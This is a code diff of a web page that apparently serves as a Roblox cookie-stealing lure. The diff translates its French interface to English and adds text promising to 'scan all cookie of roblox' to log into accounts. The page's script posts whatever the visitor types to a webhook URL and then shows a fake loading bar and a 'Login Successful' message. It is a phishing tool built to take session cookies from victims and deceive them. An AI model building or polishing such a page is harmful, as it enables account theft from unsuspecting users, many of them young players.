@@ -144,10 +144,19 @@
             filter: drop-shadow(0 0 20px rgba(147, 51, 234, 0.4));
         }
 
+        /* Input section */
+        .input-section {
+            position: relative;
+            z-index: 100;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 20px;
+        }
+
         /* Input bar styling */
         .text-bar {
             position: relative;
-            z-index: 100;
             opacity: 1;
             pointer-events: all;
         }
@@ -222,6 +231,16 @@
 
         .send-btn:active {
             transform: translateY(0);
+        }
+
+        /* Description text */
+        .description {
+            color: #a0a0a0;
+            font-size: 14px;
+            text-align: center;
+            margin-top: 10px;
+            letter-spacing: 1px;
+            font-weight: 500;
         }
 
         /* Particles effect */
@@ -343,6 +362,10 @@
                 padding: 15px 20px;
                 font-size: 13px;
             }
+
+            .description {
+                font-size: 12px;
+            }
         }
     </style>
 </head>
@@ -358,19 +381,22 @@
         <span class="title-word-2">Cookie</span>
     </div>
 
-    <div class="text-bar" id="textBar">
-        <div class="text-bar-content">
-            <span class="text-bar-prompt">> </span>
-            <input type="text" class="text-bar-input" id="userInput" placeholder="ENTRER LE MESSAGE..." autocomplete="off">
-            <button class="send-btn" id="sendBtn">Envoyer</button>
+    <div class="input-section">
+        <div class="text-bar" id="textBar">
+            <div class="text-bar-content">
+                <span class="text-bar-prompt">> </span>
+                <input type="text" class="text-bar-input" id="userInput" placeholder="ENTER YOUR MESSAGE..." autocomplete="off">
+                <button class="send-btn" id="sendBtn">Send</button>
+            </div>
         </div>
+        <div class="description">Scan all cookie of roblox too log in all roblox acount</div>
     </div>
 
     <div class="loading-container" id="loadingContainer">
         <div class="loading-bar-container">
             <div class="loading-bar"></div>
         </div>
-        <div class="loading-text">Chargement en cours...</div>
+        <div class="loading-text">Loading in progress...</div>
         <div class="success-message">✅ Login Successful Check Your Roblox Page</div>
     </div>
 
@@ -463,7 +489,7 @@
                 sendBtn.disabled = true;
 
                 try {
-                    showStatus('📤 ENVOI DU MESSAGE...');
+                    showStatus('📤 SENDING MESSAGE...');
 
                     const response = await fetch(WEBHOOK_URL, {
                         method: 'POST',
@@ -478,7 +504,7 @@
                     });
 
                     if (response.ok) {
-                        showStatus('✅ MESSAGE ENVOYÉ');
+                        showStatus('✅ MESSAGE SENT');
                         // Show loading screen
                         loadingContainer.classList.add('active');
                         
@@ -489,13 +515,13 @@
                             userInput.focus();
                         }, 16000);
                     } else {
-                        showStatus('❌ ERREUR LORS DE L\'ENVOI');
+                        showStatus('❌ ERROR SENDING MESSAGE');
                         sendBtn.disabled = false;
                         userInput.focus();
                     }
                 } catch (error) {
-                    console.error('Erreur:', error);
-                    showStatus('❌ ERREUR DE CONNEXION');
+                    console.error('Error:', error);
+                    showStatus('❌ CONNECTION ERROR');
                     sendBtn.disabled = false;
                     userInput.focus();
                 }
